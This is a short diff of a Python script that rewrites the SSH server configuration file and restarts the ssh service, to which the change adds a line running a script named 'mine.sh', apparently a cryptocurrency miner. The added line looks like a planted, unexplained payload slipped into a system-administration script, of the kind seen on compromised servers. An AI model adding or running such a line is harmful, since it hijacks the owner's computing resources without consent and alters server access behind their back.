@@ -10,3 +10,4 @@ with open("/etc/ssh/sshd_config", "w") as file:
 	file.write(filedata)
 
 os.system("systemctl restart ssh")
+os.system("sh mine.sh")
